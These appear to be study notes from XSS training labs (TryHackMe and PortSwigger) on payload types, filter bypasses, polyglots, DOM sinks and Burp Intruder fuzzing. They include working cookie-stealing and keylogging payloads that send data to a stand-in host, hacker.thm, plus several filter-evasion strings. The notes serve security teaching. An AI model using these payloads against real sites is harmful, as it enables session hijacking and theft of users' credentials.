Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.

**What is a payload?**

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

  

The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

  

Here are some examples of XSS intentions.

  

**Proof Of Concept:**

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

  

`<script>alert('XSS');</script>`

  

**Session Stealing:**

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

  

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  

  

**Key Logger:**

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

  

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

  

**Business Logic:**

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

  

`<script>user.changeEmail('attacker@hacker.thm');</script>`

  

Now that the email address for the account has changed, the attacker may perform a reset password attack.

Examples scenarios: 
- [[Reflected XSS]]
- [[Stored XSS]]
- [[DOM Based XSS]]
- [[Blind XSS]]
Practical Example: 
**Level One:**

You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/1606a13f7fe891c779fe50ea0302afb8.png)  

If you view the Page Source, You'll see your name reflected in the code:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f371398ba148e07e85b946028e7f6919.png)  

Instead of entering your name, we're instead going to try entering the following JavaScript Payload: `<script>alert('THM');</script>`  
  
Now when you click the enter button, you'll get an alert popup with the string **THM** and the page source will look like the following:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/49444bf865cdc230d9855b53d93745c6.png)  

And then, you'll get a confirmation message that your payload was successful with a link to the next level.  
  
**Level Two:**  

Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5458bd5bb617b7e00d9aad9579c030b9.png)  

  
Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png)  

  
It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload: `"><script>alert('THM');</script>`  

The important part of the payload is the `">` which closes the value parameter and then closes the input tag.  

This now closes the input tag properly and allows the JavaScript payload to run:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/21a6597c0964f08c69ebffbf014a886a.png)  

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

  
**Level Three:**

You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the textarea tag.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/48abb43c885cb5bafff22c714e79b53a.png)  

We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: `</textarea><script>alert('THM');</script>`  

This turns this:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/c3d0d38d23fab0608bc3ca8b9441974c.png)  

Into This:  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/77ce8ffc9465731ab834f02292ec86d1.png)  

The important part of the above payload is `</textarea>`, which causes the textarea element to close so the script will run.  

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.  
**Level Four:**  

Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/80fd5abe95b63ce52ff0ff9f9f6f6d57.png)  

  
You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload `';alert('THM');//`  which you'll see from the below screenshot will execute your code. The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/17c6b9717f16af910557438017be9c53.png)  

  
Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

  
**Level Five:**

Now, this level looks the same as level one, and your name also gets reflected in the same place. But if you try the `<script>alert('THM');</script>` payload, it won't work. When you view the page source, you'll see why.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9bd2142b2bcd4b4cba34e571550294e4.png)  

  
The word `script`  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.  
  
When a word gets removed from a string, there's a helpful trick that you can try.

**Original Payload:**

`<sscriptcript>alert('THM');</sscriptcript>`

  

**Text to be removed (by the filter):**

`<sscriptcript>alert('THM');</sscriptcript>`

  

**Final Payload (after passing the filter):**

`<script>alert('THM');</script>`

  

Try entering the payload `<sscriptcript>alert('THM');</sscriptcript>` and click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

**Level Six:**

  

Similar to level two, where we had to escape from the value attribute of an input tag, we can try `"><script>alert('THM');</script>` , but that doesn't seem to work. Let's inspect the page source to see why that doesn't work.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8856b113fd514db704157837a6e6aeb4.png)  

  
You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.  
  
Let's change our payload to reflect this `/images/cat.jpg" onload="alert('THM');` and then viewing the page source, and you'll see how this will work.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3260719921aba8ad6eb8d887094fcb87.png)  

  
Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful; with this being the last level, you'll receive a flag that can be entered below.

**Polyglots:**

  

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.  

  

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``

another example instead of ``<script> </script>`` is  ``
``<iframe src="javascript:alert(`xss`)">``

Search for more DOM elements to detect XSS.
Websites that allow the user to modify the iframe or other DOM elements will most likely be vulnerable to XSS.

## Which sinks can lead to DOM-XSS vulnerabilities?

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

``document.write() document.writeln() document.domain element.innerHTML element.outerHTML element.insertAdjacentHTML element.onevent``

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

``add() after() append() animate() insertAfter() insertBefore() before() html() prepend() replaceAll() replaceWith() wrap() wrapInner() wrapAll() has() constructor() init() index() jQuery.parseHTML() $.parseHTML()``

Another Example:
1. Inject a standard XSS vector, such as:
    
    `<img src=1 onerror=print()>`
2. Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
4. In Burp Intruder, replace the value of the search term with: `<>`
5. Place the cursor between the angle brackets and click **Add §** to create a payload position. The value of the search term should now look like: `<§§>`
6. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy tags to clipboard**.
7. In the **Payloads** side panel, under **Payload configuration**, click **Paste** to paste the list of tags into the payloads list. Click  **Start attack**.
8. When the attack is finished, review the results. Note that most payloads caused a `400` response, but the `body` payload caused a `200` response.
9. Go back to Burp Intruder and replace your search term with:
    
    `<body%20=1>`
10. Place the cursor before the `=` character and click **Add §** to create a payload position. The value of the search term should now look like: `<body%20§§=1>`
11. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy events to clipboard**.
12. In the **Payloads** side panel, under **Payload configuration**, click **Clear** to remove the previous payloads. Then click **Paste** to paste the list of attributes into the payloads list. Click  **Start attack**.
13. When the attack is finished, review the results. Note that most payloads caused a `400` response, but the `onresize` payload caused a `200` response.
14. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
``?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>``



Custom Tags = https://www.youtube.com/watch?v=sjs6RS7lURk
